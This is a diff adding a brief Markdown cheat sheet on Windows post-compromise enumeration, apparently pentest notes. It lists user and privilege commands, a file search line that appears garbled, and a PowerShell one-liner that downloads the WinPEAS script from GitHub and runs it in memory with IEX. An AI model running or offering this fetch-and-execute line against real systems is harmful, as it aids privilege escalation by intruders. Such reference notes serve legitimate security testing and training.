@@ -1,0 +1,31 @@
+# Windows
+
+## System Enumeration
+
+### List Users
+
+```batch
+net user
+```
+
+### User Privileges
+
+```batch
+whoami /priv
+```
+
+### Search Files
+
+> If you dont know the full path of the file or even the extension, you can use: `*<FILE>*`
+
+```batch
+cmd /s <FILE>
+```
+
+### WinPEAS
+
+> https://github.com/peass-ng/PEASS-ng
+
+```powershell
+powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
+```
